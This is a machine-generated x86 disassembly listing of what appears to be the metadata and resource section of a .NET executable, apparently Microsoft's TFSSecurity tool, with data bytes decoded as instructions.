  40c432:	or     BYTE PTR ds:0x12150912,bl
  40c438:	xor    cl,0x1
  40c43b:	adc    al,BYTE PTR [eax-0x7eeeea17]
  40c441:	popa   
  40c442:	add    cl,BYTE PTR [esi]
  40c444:	adc    ah,BYTE PTR ds:0x8012004
  40c44a:	push   cs
  40c44b:	push   es
  40c44c:	add    BYTE PTR [ebx],al
  40c44e:	add    DWORD PTR [esi],ecx
  40c450:	sbb    al,0x1c
  40c452:	adc    al,0x7
  40c454:	or     BYTE PTR [esi],cl
  40c456:	push   cs
  40c457:	add    cl,BYTE PTR [esi]
  40c459:	or     BYTE PTR [edx],dl
  40c45b:	sub    cl,0x1d
  40c45e:	sbb    al,0x15
  40c460:	adc    al,BYTE PTR [eax-0x7fedfe0f]
  40c466:	jmp    0xe44cb78
  40c46b:	push   cs
  40c46c:	adc    eax,0x2618111
  40c471:	push   cs
  40c472:	adc    ah,BYTE PTR ds:0x1200608
  40c478:	sbb    eax,0x60e2912
  40c47d:	and    BYTE PTR [ebx],al
  40c47f:	add    DWORD PTR [esi],ecx
  40c481:	push   cs
  40c482:	add    al,BYTE PTR [esi]
  40c484:	and    BYTE PTR [edx],al
  40c486:	add    DWORD PTR [esi],ecx
  40c488:	adc    ch,BYTE PTR [ecx]
  40c48a:	or     BYTE PTR [edi],al
  40c48c:	add    al,0x2
  40c48e:	push   cs
  40c48f:	adc    ch,BYTE PTR [ecx]
  40c491:	sbb    eax,0x5070a1c
  40c496:	add    cl,BYTE PTR [esi]
  40c498:	adc    cl,BYTE PTR [ecx]
  40c49a:	adc    ch,BYTE PTR [ecx]
  40c49c:	sbb    eax,0x206021c
  40c4a1:	add    eax,0x120e0207
  40c4a6:	or     DWORD PTR [edx],ecx
  40c4a8:	pop    es
  40c4a9:	add    al,0x12
  40c4ab:	sub    DWORD PTR ds:0x29121d1c,ebx
  40c4b1:	or     BYTE PTR ds:0x1e000130,al
  40c4b7:	add    BYTE PTR [edx+ecx*1],al
  40c4ba:	add    DWORD PTR [edx],edx
  40c4bc:	xor    DWORD PTR [edx+ecx*1],eax
  40c4bf:	add    DWORD PTR [edx],edx
  40c4c1:	xor    eax,0x12010a04
  40c4c6:	cmp    DWORD PTR [ecx],ecx
  40c4c8:	and    BYTE PTR [eax],al
  40c4ca:	adc    eax,0x1e58012
  40c4cf:	adc    ah,BYTE PTR ds:0x80121507
  40c4d5:	in     eax,dx
  40c4d6:	add    DWORD PTR [edx],edx
  40c4d8:	and    eax,0x80121507
  40c4dd:	icebp  
  40c4de:	add    DWORD PTR [edx],edx
  40c4e0:	and    eax,0x1202070b
  40c4e5:	and    eax,0xf1801215
  40c4ea:	add    DWORD PTR [edx],edx
  40c4ec:	and    eax,0x101200a
  40c4f1:	adc    eax,0x1658112
  40c4f6:	adc    eax,DWORD PTR [eax]
  40c4f8:	inc    eax
  40c4f9:	add    DWORD PTR [eax],eax
  40c4fb:	xor    edx,DWORD PTR [ebx+0x79]
  40c4fe:	jae    0x40c574
  40c500:	gs ins DWORD PTR es:[edi],dx
  40c502:	cs push edx
  40c504:	gs jae 0x40c576
  40c507:	jne    0x40c57b
  40c509:	arpl   WORD PTR [ebp+0x73],sp
  40c50c:	cs push esp
  40c50e:	outs   dx,DWORD PTR ds:[esi]
  40c50f:	outs   dx,DWORD PTR ds:[esi]
  40c510:	ins    BYTE PTR es:[edi],dx
  40c511:	jae    0x40c541
  40c513:	push   ebx
  40c514:	je     0x40c588
  40c516:	outs   dx,DWORD PTR ds:[esi]
  40c517:	outs   dx,BYTE PTR ds:[esi]
  40c518:	ins    BYTE PTR es:[di],dx
  40c51a:	jns    0x40c570
  40c51c:	jns    0x40c58e
  40c51e:	gs fs push edx
  40c521:	gs jae 0x40c593
  40c524:	jne    0x40c598
  40c526:	arpl   WORD PTR [ebp+0x42],sp
  40c529:	jne    0x40c594
  40c52b:	ins    BYTE PTR es:[edi],dx
  40c52c:	fs gs jb 0x40c537
  40c530:	xor    al,0x2e
  40c532:	xor    BYTE PTR [esi],ch
  40c534:	xor    BYTE PTR [esi],ch
  40c536:	xor    BYTE PTR [eax],al
  40c538:	add    BYTE PTR ds:0x1c020200,al
  40c53e:	sbb    al,0x8
  40c540:	add    BYTE PTR [ecx],al
  40c542:	adc    al,BYTE PTR [ecx+0x75811171]
  40c548:	add    eax,0x81120020
  40c54d:	jns    0x40c556
  40c54f:	and    BYTE PTR [edx],al
  40c551:	add    DWORD PTR [esi],ecx
  40c553:	adc    al,BYTE PTR [ecx+0x1070479]
  40c559:	adc    al,BYTE PTR [ecx+0x6]
  40c55c:	and    BYTE PTR [edx],al
  40c55e:	push   cs
  40c55f:	push   cs
  40c560:	adc    al,BYTE PTR [ebp+0x6]
  40c563:	and    BYTE PTR [ecx],al
  40c565:	add    DWORD PTR [ecx],edx
  40c567:	add    DWORD PTR [ecx+0x2000108],0x0
  40c571:	add    BYTE PTR [edi],dh
  40c573:	add    DWORD PTR [eax],eax
  40c575:	sbb    ch,BYTE PTR [esi]
  40c577:	dec    esi
  40c578:	inc    ebp
  40c579:	push   esp
  40c57a:	inc    esi
  40c57b:	jb     0x40c5de
  40c57d:	ins    DWORD PTR es:[edi],dx
  40c57e:	gs ja  0x40c5f0
  40c581:	jb     0x40c5ee
  40c583:	sub    al,0x56
  40c585:	gs jb  0x40c5fb
  40c588:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40c58f:	xor    eax,0xe540001
  40c594:	adc    al,0x46
  40c596:	jb     0x40c5f9
  40c598:	ins    DWORD PTR es:[edi],dx
  40c599:	gs ja  0x40c60b
  40c59c:	jb     0x40c609
  40c59e:	inc    esp
  40c59f:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  40c5a6:	popa   
  40c5a7:	ins    DWORD PTR es:[edi],dx
  40c5a8:	add    BYTE PTR gs:0x1,al
  40c5af:	add    BYTE PTR ds:0x10001,al
  40c5b5:	add    BYTE PTR [ecx+eax*1],dl
  40c5b8:	add    BYTE PTR [edi],cl
  40c5ba:	push   esp
  40c5bb:	inc    esi
  40c5bc:	push   ebx
  40c5bd:	push   ebx
  40c5be:	arpl   WORD PTR gs:[ebp+0x72],si
  40c5c2:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x657865
  40c5ca:	add    BYTE PTR [edx],bl
  40c5cc:	add    DWORD PTR [eax],eax
  40c5ce:	adc    eax,0x7263694d
  40c5d3:	outs   dx,DWORD PTR ds:[esi]
  40c5d4:	jae    0x40c645
  40c5d6:	data16 je 0x40c5f9
  40c5d9:	inc    ebx
  40c5da:	outs   dx,DWORD PTR ds:[esi]
  40c5db:	jb     0x40c64d
  40c5dd:	outs   dx,DWORD PTR ds:[esi]
  40c5de:	jb     0x40c641
  40c5e0:	je     0x40c64b
  40c5e2:	outs   dx,DWORD PTR ds:[esi]
  40c5e3:	outs   dx,BYTE PTR ds:[esi]
  40c5e4:	add    BYTE PTR [eax],al
  40c5e6:	and    eax,0x4d200001
  40c5eb:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40c5f2:	je     0x40c5b6
  40c5f4:	scas   al,BYTE PTR es:[edi]
  40c5f5:	and    BYTE PTR [esi+0x69],dl
  40c5f8:	jae    0x40c66f
  40c5fa:	popa   
  40c5fb:	ins    BYTE PTR es:[edi],dx
  40c5fc:	and    BYTE PTR [ebx+0x74],dl
  40c5ff:	jne    0x40c665
  40c601:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  40c608:	xor    DWORD PTR [edx],esi
  40c60a:	add    BYTE PTR [eax],al
  40c60c:	xor    eax,DWORD PTR [ecx]
  40c60e:	add    BYTE PTR [esi],ch
  40c610:	ret    0x20a9
  40c613:	dec    ebp
  40c614:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40c61b:	je     0x40c63d
  40c61d:	inc    ebx
  40c61e:	outs   dx,DWORD PTR ds:[esi]
  40c61f:	jb     0x40c691
  40c621:	outs   dx,DWORD PTR ds:[esi]
  40c622:	jb     0x40c685
  40c624:	je     0x40c68f
  40c626:	outs   dx,DWORD PTR ds:[esi]
  40c627:	outs   dx,BYTE PTR ds:[esi]
  40c628:	and    BYTE PTR cs:[ecx+0x6c],al
  40c62c:	ins    BYTE PTR es:[edi],dx
  40c62d:	and    BYTE PTR [edx+0x69],dh
  40c630:	addr16 push 0x72207374
  40c636:	gs jae 0x40c69e
  40c639:	jb     0x40c6b1
  40c63b:	gs fs add BYTE PTR cs:[eax],al
  40c640:	adc    DWORD PTR [ecx],eax
  40c642:	add    BYTE PTR [ecx+esi*1],cl
  40c645:	xor    DWORD PTR [esi],ebp
  40c647:	xor    BYTE PTR [esi],ch
  40c649:	xor    eax,0x37323730
  40c64e:	xor    DWORD PTR cs:[eax],eax
  40c651:	add    BYTE PTR ds:0x31080001,cl
  40c657:	xor    DWORD PTR [esi],ebp
  40c659:	xor    BYTE PTR [esi],ch
  40c65b:	xor    BYTE PTR [esi],ch
  40c65d:	xor    BYTE PTR [eax],al
  40c65f:	add    BYTE PTR [edx],cl
  40c661:	add    DWORD PTR [eax],eax
  40c663:	add    eax,0x552d6e65
  40c668:	push   ebx
  40c669:	add    BYTE PTR [eax],al
  40c66b:	sub    al,BYTE PTR [ecx]
  40c66d:	add    BYTE PTR ds:0x645c3a46,ah
  40c673:	fs pop esp
  40c675:	je     0x40c6e6
  40c677:	outs   dx,DWORD PTR ds:[esi]
  40c678:	ins    BYTE PTR es:[edi],dx
  40c679:	jae    0x40c6d7
  40c67b:	fs gs jbe 0x40c6e3
  40c67f:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40c686:	ins    BYTE PTR es:[edi],dx
  40c687:	push   eax
  40c688:	jne    0x40c6ec
  40c68a:	ins    BYTE PTR es:[edi],dx
  40c68b:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40c692:	outs   dx,BYTE PTR ds:[esi]
  40c693:	imul   eax,DWORD PTR [eax],0x0
  40c696:	or     DWORD PTR [eax+0x1],0x0
  40c69a:	add    BYTE PTR [eax+0x30],0x30
  40c69e:	xor    dh,BYTE PTR [eax+esi*1]
  40c6a1:	xor    BYTE PTR [eax],dh
  40c6a3:	xor    BYTE PTR [eax],dh
  40c6a5:	arpl   WORD PTR [eax],di
  40c6a7:	xor    BYTE PTR [eax],dh
  40c6a9:	xor    BYTE PTR [eax],dh
  40c6ab:	xor    BYTE PTR [ecx],dh
  40c6ad:	xor    al,0x30
  40c6af:	xor    DWORD PTR [eax],esi
  40c6b1:	xor    BYTE PTR [eax],dh
  40c6b3:	xor    BYTE PTR [eax],dh
  40c6b5:	xor    BYTE PTR ss:[edx],dh
  40c6b8:	xor    BYTE PTR [eax],dh
  40c6ba:	xor    BYTE PTR [eax],dh
  40c6bc:	xor    BYTE PTR [eax],dh
  40c6be:	xor    dh,BYTE PTR [eax+esi*1]
  40c6c1:	xor    BYTE PTR [eax],dh
  40c6c3:	xor    BYTE PTR ds:0x34333532,dh
  40c6c9:	xor    DWORD PTR [ebx],esi
  40c6cb:	xor    DWORD PTR [eax],esi
  40c6cd:	xor    BYTE PTR [eax],dh
  40c6cf:	cmp    BYTE PTR [eax],dh
  40c6d1:	xor    BYTE PTR [eax],dh
  40c6d3:	xor    BYTE PTR [eax],dh
  40c6d5:	xor    DWORD PTR [eax],esi
  40c6d7:	xor    BYTE PTR [eax],dh
  40c6d9:	xor    DWORD PTR [eax],esi
  40c6db:	xor    BYTE PTR [esi],dh
  40c6dd:	xor    DWORD PTR [ebx],esi
  40c6df:	xor    edi,DWORD PTR [ecx]
  40c6e1:	cmp    DWORD PTR [ecx+0x66],esp
  40c6e4:	xor    WORD PTR [eax],di
  40c6e7:	xor    WORD PTR gs:[ecx+0x32],sp
  40c6ec:	arpl   WORD PTR [edx],si
  40c6ee:	xor    eax,0x32613431
  40c6f3:	aaa    
  40c6f4:	xor    esp,DWORD PTR [ecx+0x34]
  40c6f7:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  40c6fb:	xor    al,0x32
  40c6fd:	bound  esi,QWORD PTR [edi]
  40c6ff:	xor    dh,BYTE PTR [ebx]
  40c701:	xor    dh,BYTE PTR [ecx]
  40c703:	xor    WORD PTR [edi],si
  40c706:	xor    eax,0x32303137
  40c70b:	cmp    WORD PTR fs:[ebp+0x62],sp
  40c710:	popa   
  40c711:	fs popa 
  40c713:	cmp    DWORD PTR ss:[ecx],edi
  40c716:	xor    dh,BYTE PTR [ebx]
  40c718:	xor    dh,BYTE PTR gs:[edi]
  40c71b:	xor    edi,DWORD PTR [eax]
  40c71d:	xor    al,0x30
  40c71f:	arpl   WORD PTR ss:[edx],si
  40c722:	xor    DWORD PTR [ebp+0x35],esp
  40c725:	bound  edi,QWORD PTR [eax]
  40c727:	xor    BYTE PTR [ecx],dh
  40c729:	xor    eax,0x62613235
  40c72e:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  40c732:	xor    BYTE PTR [ecx+0x36],ah
  40c735:	xor    eax,0x35333261
  40c73a:	xor    BYTE PTR gs:[eax],dh
  40c73d:	xor    DWORD PTR [ecx+0x63],esp
  40c740:	cmp    DWORD PTR [ecx+0x64],esp
  40c743:	arpl   WORD PTR [edx],si
  40c745:	xor    eax,0x38643266
  40c74a:	xor    DWORD PTR [ecx],esi
  40c74c:	bound  esi,QWORD PTR gs:[eax]
  40c74f:	cmp    DWORD PTR [ecx+edi*1],esi
  40c752:	ss popa 
  40c754:	xor    al,0x63
  40c756:	ss popa 
  40c758:	xor    eax,0x36346439
  40c75d:	xor    DWORD PTR [ecx],edi
  40c75f:	xor    eax,0x36633938
  40c764:	cmp    DWORD PTR [esi+0x35],esp
  40c767:	bound  esp,QWORD PTR [ecx+0x66]
  40c76a:	xor    BYTE PTR [ebx+0x34],ah
  40c76d:	xor    DWORD PTR [edi],esi
  40c76f:	cmp    DWORD PTR [ecx+0x34],esp
  40c772:	aaa    
  40c773:	xor    esi,DWORD PTR [ecx]
  40c775:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  40c779:	xor    eax,0x64633535
  40c77e:	xor    BYTE PTR [eax],dh
  40c780:	ss popa 
  40c782:	arpl   WORD PTR [ebx+0x38],sp
  40c785:	bound  esi,QWORD PTR ds:0x66393539
  40c78b:	xor    ah,BYTE PTR [edx+0x64]
  40c78e:	ss xor DWORD PTR gs:[eax],esi
  40c792:	xor    esi,DWORD PTR gs:[esi]
  40c795:	xor    BYTE PTR [ebx+0x33],ah
  40c798:	xor    al,0x35
  40c79a:	xor    esi,DWORD PTR [edi]
  40c79c:	popa   
  40c79d:	xor    DWORD PTR [edx+esi*1+0x36],esp
  40c7a1:	ss fs popa 
  40c7a4:	cmp    BYTE PTR [eax],dh
  40c7a6:	cmp    BYTE PTR ds:0x35363538,dh
  40c7ac:	cmp    BYTE PTR [ebx],dh
  40c7ae:	arpl   WORD PTR [eax],di
  40c7b0:	xor    eax,0x64313864
  40c7b5:	popa   
  40c7b6:	aaa    
  40c7b7:	xor    sp,WORD PTR [ebp+0x63]
  40c7bb:	xor    BYTE PTR [ecx],dh
  40c7bd:	gs cmp DWORD PTR fs:0x35633436,esi
  40c7c5:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  40c7c9:	fs aaa 
  40c7cb:	xor    DWORD PTR [ebx],esi
  40c7cd:	arpl   WORD PTR [eax+esi*1+0x31],sp
  40c7d1:	aaa    
  40c7d2:	xor    ah,BYTE PTR [ebx+0x38]
  40c7d5:	xor    dh,BYTE PTR gs:[ebx]
  40c7d8:	popa   
  40c7d9:	xor    DWORD PTR [eax],esi
  40c7db:	data16 xor BYTE PTR [edx],dh
  40c7de:	xor    edi,DWORD PTR [ecx]
  40c7e0:	bound  edi,QWORD PTR [eax]
  40c7e2:	xor    BYTE PTR [ebx+0x39],ah
  40c7e5:	bound  esi,QWORD PTR ss:[eax]
  40c7e8:	aaa    
  40c7e9:	aaa    
  40c7ea:	xor    esi,DWORD PTR [esi]
  40c7ec:	xor    ax,0x3864
  40c7f0:	bound  esi,QWORD PTR [eax]
  40c7f2:	xor    dh,BYTE PTR [edx]
  40c7f4:	xor    eax,0x34613234
  40c7f9:	gs aaa 
  40c7fb:	xor    al,0x32
  40c7fd:	xor    eax,0x66356131
  40c802:	xor    al,0x33
  40c804:	xor    bh,BYTE PTR [eax]
  40c806:	xor    dh,BYTE PTR [ebx+esi*1]
  40c809:	xor    DWORD PTR [eax],edi
  40c80b:	bound  esi,QWORD PTR [ebx]
  40c80d:	xor    eax,0x35613933
  40c812:	popa   
  40c813:	xor    BYTE PTR [eax],bh
  40c815:	aaa    
  40c816:	data16 cmp BYTE PTR [ebp+0x35],ah
  40c81a:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  40c81e:	xor    DWORD PTR [ebx],esi
  40c820:	xor    eax,0x61633966
  40c825:	xor    al,0x37
  40c827:	xor    sp,WORD PTR [edx+0x62]
  40c82b:	xor    ah,BYTE PTR [ebp+0x31]
  40c82e:	xor    BYTE PTR [ecx+0x66],ah
  40c831:	data16 xor BYTE PTR [ecx+0x66],ah
  40c835:	xor    BYTE PTR [eax],bh
  40c837:	xor    al,0x39
  40c839:	xor    eax,0x62663430
  40c83e:	aaa    
  40c83f:	arpl   WORD PTR [ebp+0x61],sp
  40c842:	xor    esp,DWORD PTR [esi+0x66]
  40c845:	xor    DWORD PTR [ecx],edi
  40c847:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  40c84b:	fs xor BYTE PTR gs:[ebp+0x64],ah
  40c850:	popa   
  40c851:	fs ss xor al,0x63
  40c855:	cmp    BYTE PTR ss:[ebp+0x66],ah
  40c859:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  40c85e:	xor    eax,0x30336436
  40c863:	xor    ah,BYTE PTR [ecx+0x64]
  40c866:	xor    eax,0x36646635
  40c86b:	cmp    BYTE PTR gs:[eax],dh
  40c86e:	xor    si,WORD PTR [eax]
  40c871:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  40c875:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  40c87a:	cmp    DWORD PTR gs:0x38353633,esi
  40c881:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  40c889:	bound  esi,QWORD PTR ds:0x63363366
  40c88f:	xor    eax,0x66653234
  40c894:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  40c899:	data16 cmp BYTE PTR [eax],bh
  40c89c:	cmp    BYTE PTR ds:0x33643833,dh
  40c8a2:	aaa    
  40c8a3:	xor    al,0x63
  40c8a5:	xor    WORD PTR gs:[eax],si
  40c8a9:	ss popa 
  40c8ab:	arpl   WORD PTR [esi+0x37],sp
  40c8ae:	cmp    DWORD PTR fs:[ebx],esi
  40c8b1:	popa   
  40c8b2:	xor    al,0x34
  40c8b4:	xor    al,0x35
  40c8b6:	arpl   WORD PTR [ebx],si
  40c8b8:	arpl   WORD PTR [edi],si
  40c8ba:	xor    esp,DWORD PTR [ebx+0x64]
  40c8bd:	cmp    DWORD PTR [ecx],esi
  40c8bf:	xor    DWORD PTR [esi+0x30],esp
  40c8c2:	xor    eax,0x61613137
  40c8c7:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  40c8cc:	fs popa 
  40c8ce:	xor    DWORD PTR [edx],esi
  40c8d0:	bound  esi,QWORD PTR [ecx]
  40c8d2:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  40c8d6:	arpl   WORD PTR [ebx],si
  40c8d8:	aaa    
  40c8d9:	xor    eax,0x813362
  40c8de:	popa   
  40c8df:	xor    eax,0x36363861
  40c8e4:	xor    DWORD PTR gs:[ebp+0x65],esp
  40c8e8:	xor    DWORD PTR [eax],edi
  40c8ea:	data16 cmp BYTE PTR ss:[eax],dh
  40c8ee:	aaa    
  40c8ef:	ss cmp BYTE PTR ss:[edx],dh
  40c8f3:	xor    BYTE PTR [ecx],bh
  40c8f5:	xor    sp,WORD PTR [edx+0x31]
  40c8f9:	xor    DWORD PTR [edx],esi
  40c8fb:	xor    esi,DWORD PTR [esi]
  40c8fd:	popa   
  40c8fe:	arpl   WORD PTR [ebp+0x35],sp
  40c901:	xor    dh,BYTE PTR gs:[ecx]
  40c904:	xor    WORD PTR [ecx],si
  40c907:	aaa    
  40c908:	cmp    BYTE PTR [eax],dh
  40c90a:	xor    esp,DWORD PTR [ecx+0x33]
  40c90d:	xor    DWORD PTR [ebx+esi*1],esi
  40c910:	popa   
  40c911:	bound  esp,QWORD PTR [edx+0x31]
  40c914:	xor    dh,BYTE PTR [esi]
  40c916:	fs xor BYTE PTR fs:[ebx],dh
  40c91a:	xor    eax,0x32643764
  40c91f:	data16 cmp BYTE PTR [edi],dh
  40c922:	bound  esi,QWORD PTR ss:[esi]
  40c925:	cmp    DWORD PTR [ebx],esi
  40c927:	cmp    BYTE PTR [ecx+0x61],ah
  40c92a:	data16 xor ah,BYTE PTR [ebp+0x65]
  40c92e:	xor    esi,DWORD PTR [ecx+esi*1]
  40c931:	xor    al,0x64
  40c933:	xor    eax,0x64303234
  40c938:	aaa    
  40c939:	xor    eax,0x31323633
  40c93e:	xor    al,0x30
  40c940:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  40c944:	xor    al,0x61
  40c946:	xor    al,0x39
  40c948:	arpl   WORD PTR [eax+edi*1],si
  40c94b:	arpl   WORD PTR ss:[ebp+0x31],sp
  40c94f:	xor    esi,DWORD PTR [ebx+esi*1]
  40c952:	xor    BYTE PTR [eax],dh
  40c954:	popa   
  40c955:	xor    dh,BYTE PTR [ecx]
  40c957:	xor    BYTE PTR [esi],dh
  40c959:	popa   
  40c95a:	bound  esi,QWORD PTR fs:[esi]
  40c95d:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  40c961:	xor    esi,DWORD PTR [ebx]
  40c963:	xor    eax,0x65663039
  40c968:	data16 cmp BYTE PTR [ecx+0x64],ah
  40c96c:	xor    eax,0x63333463
  40c971:	bound  esp,QWORD PTR [ecx+0x38]
  40c974:	xor    dh,BYTE PTR [edx]
  40c976:	cmp    DWORD PTR [eax],esi
  40c978:	arpl   WORD PTR fs:[ecx+edi*1],si
  40c97c:	xor    eax,0x66653033
  40c981:	data16 cmp BYTE PTR fs:[esi],dh
  40c985:	xor    eax,0x39643332
  40c98a:	xor    al,0x38
  40c98c:	xor    esp,DWORD PTR [ebx+0x30]
  40c98f:	xor    BYTE PTR [esi+0x34],ah
  40c992:	xor    eax,0x34666138
  40c997:	cmp    BYTE PTR ss:[ecx],bh
  40c99a:	xor    BYTE PTR [eax],dh
  40c99c:	xor    esi,DWORD PTR [esi]
  40c99e:	bound  esi,QWORD PTR [eax]
  40c9a0:	xor    ah,BYTE PTR gs:[ebx+0x36]
  40c9a4:	xor    DWORD PTR [eax+esi*1+0x37],esp
  40c9a8:	aaa    
  40c9a9:	fs aaa 
  40c9ab:	bound  sp,DWORD PTR [ecx+0x63]
  40c9af:	xor    al,0x36
  40c9b1:	aaa    
  40c9b2:	popa   
  40c9b3:	xor    eax,0x62653630
  40c9b8:	popa   
  40c9b9:	xor    bh,BYTE PTR [ecx]
  40c9bb:	gs xor al,0x36
  40c9be:	aaa    
  40c9bf:	popa   
  40c9c0:	cmp    BYTE PTR [edi],dh
  40c9c2:	xor    DWORD PTR [ecx],edi
  40c9c4:	cmp    BYTE PTR [edx+0x30],ah
  40c9c7:	xor    eax,0x34376333
  40c9cc:	cmp    DWORD PTR [ecx+0x61],esp
  40c9cf:	xor    ah,BYTE PTR [ecx+0x34]
  40c9d2:	xor    bh,BYTE PTR fs:[eax]
  40c9d5:	xor    al,0x30
  40c9d7:	arpl   WORD PTR [edi],si
  40c9d9:	cmp    BYTE PTR [eiz*2+0x6436],dh
  40c9e0:	push   ds
  40c9e1:	add    DWORD PTR [eax],eax
  40c9e3:	add    DWORD PTR [eax],eax
  40c9e5:	push   esp
  40c9e6:	add    dl,BYTE PTR [esi]
  40c9e8:	push   edi
  40c9e9:	jb     0x40ca4c
  40c9eb:	jo     0x40ca3b
  40c9ed:	outs   dx,DWORD PTR ds:[esi]
  40c9ee:	outs   dx,BYTE PTR ds:[esi]
  40c9ef:	inc    ebp
  40c9f0:	js     0x40ca55
  40c9f2:	gs jo  0x40ca69
  40c9f5:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40c9fc:	ja     0x40ca71
  40c9fe:	add    DWORD PTR [eax],ecx
  40ca00:	add    DWORD PTR [eax],eax
  40ca02:	or     BYTE PTR [eax],al
  40ca04:	add    BYTE PTR [eax],al
  40ca06:	add    BYTE PTR [eax],al
  40ca08:	sub    BYTE PTR [ecx-0x787ffed2],0x53
  40ca0f:	jns    0x40ca84
  40ca11:	je     0x40ca78
  40ca13:	ins    DWORD PTR es:[edi],dx
  40ca14:	cs push ebx
  40ca16:	arpl   WORD PTR gs:[ebp+0x72],si
  40ca1a:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  40ca22:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40ca29:	cs inc ebp
  40ca2b:	outs   dx,BYTE PTR ds:[esi]
  40ca2c:	jbe    0x40ca97
  40ca2e:	jb     0x40ca9f
  40ca30:	outs   dx,BYTE PTR ds:[esi]
  40ca31:	ins    DWORD PTR es:[edi],dx
  40ca32:	outs   dx,BYTE PTR gs:[esi]
  40ca34:	je     0x40ca86
  40ca36:	gs jb  0x40caa6
  40ca39:	imul   esi,DWORD PTR [ebx+0x73],0x416e6f69
  40ca40:	je     0x40cab6
  40ca42:	jb     0x40caad
  40ca44:	bound  esi,QWORD PTR [ebp+0x74]
  40ca47:	gs sub al,0x20
  40ca4a:	ins    DWORD PTR es:[edi],dx
  40ca4b:	jae    0x40cab0
  40ca4d:	outs   dx,DWORD PTR ds:[esi]
  40ca4e:	jb     0x40cabc
  40ca50:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40ca57:	jae    0x40cac2
  40ca59:	outs   dx,DWORD PTR ds:[esi]
  40ca5a:	outs   dx,BYTE PTR ds:[esi]
  40ca5b:	cmp    eax,0x2e302e34
  40ca60:	xor    BYTE PTR [esi],ch
  40ca62:	xor    BYTE PTR [eax+eiz*1],ch
  40ca65:	inc    ebx
  40ca66:	jne    0x40cad4
  40ca68:	je     0x40cadf
  40ca6a:	jb     0x40cad1
  40ca6c:	cmp    eax,0x7475656e
  40ca71:	jb     0x40cad4
  40ca73:	ins    BYTE PTR es:[edi],dx
  40ca74:	sub    al,0x20
  40ca76:	push   eax
  40ca77:	jne    0x40cadb
  40ca79:	ins    BYTE PTR es:[edi],dx
  40ca7a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40ca81:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40ca85:	bound  esi,QWORD PTR [edi]
  40ca87:	aaa    
  40ca88:	popa   
  40ca89:	xor    eax,0x31363563
  40ca8e:	cmp    DWORD PTR [ebx],esi
  40ca90:	xor    al,0x65
  40ca92:	xor    BYTE PTR [eax],bh
  40ca94:	cmp    DWORD PTR ds:0x40e5401,ebx
  40ca9a:	push   edx
  40ca9b:	gs popa 
  40ca9d:	fs adc al,0x54
  40caa0:	inc    esi
  40caa1:	push   ebx
  40caa2:	push   ebx
  40caa3:	inc    ebp
  40caa4:	inc    ebx
  40caa5:	push   ebp
  40caa6:	push   edx
  40caa7:	dec    ecx
  40caa8:	push   esp
  40caa9:	pop    ecx
  40caaa:	pop    edi
  40caab:	push   ebx
  40caac:	push   edi
  40caad:	dec    ecx
  40caae:	push   esp
  40caaf:	inc    ebx
  40cab0:	dec    eax
  40cab1:	inc    ebp
  40cab2:	push   ebx
  40cab3:	add    BYTE PTR [eax],al
  40cab5:	add    BYTE PTR [eax],al
  40cab7:	add    BYTE PTR [ebx],al
  40cab9:	loopne 0x40cacc
  40cabb:	push   eax
  40cabc:	add    BYTE PTR [eax],al
  40cabe:	add    BYTE PTR [eax],al
  40cac0:	add    al,BYTE PTR [eax]
  40cac2:	add    BYTE PTR [eax],al
  40cac4:	sbb    al,0x1
  40cac6:	add    BYTE PTR [eax],al
  40cac8:	ror    dl,1
  40caca:	add    BYTE PTR [eax],al
  40cacc:	shr    BYTE PTR [eax+eax*1+0x44535200],1
  40cad3:	push   ebx
  40cad4:	jae    0x40cac0
  40cad6:	jns    0x40ca6c
  40cad8:	cli    
  40cad9:	sub    esp,ebp
  40cadb:	dec    ecx
  40cadc:	call   0x2122:0xeadfcdab
  40cae3:	cmp    eax,0x1
  40cae8:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  40caed:	outs   dx,BYTE PTR ds:[esi]
  40caee:	popa   
  40caef:	jb     0x40cb5a
  40caf1:	gs jae 0x40cb50
  40caf4:	dec    ecx
  40caf5:	outs   dx,BYTE PTR ds:[esi]
  40caf6:	je     0x40cb5d
  40caf8:	jb     0x40cb67
  40cafa:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  40cb03:	gs je  0x40cb62
  40cb06:	addr16 jae 0x40cb7c
  40cb09:	jne    0x40cb7f
  40cb0b:	imul   ebp,DWORD PTR [esi+ebp*1+0x63],0x6f727073
  40cb13:	push   0x5f
  40cb15:	xor    DWORD PTR ds:0x30313533,esi
  40cb1b:	aaa    
  40cb1c:	xor    BYTE PTR [edi],dh
  40cb1e:	xor    al,0x5c
  40cb20:	outs   dx,DWORD PTR ds:[esi]
  40cb21:	bound  ebp,QWORD PTR [edx+0x72]
  40cb24:	pop    esp
  40cb25:	js     0x40cb5f
  40cb27:	ss pop esp
  40cb29:	push   esp
  40cb2a:	inc    esi
  40cb2b:	push   ebx
  40cb2c:	push   ebx
  40cb2d:	arpl   WORD PTR gs:[ebp+0x72],si
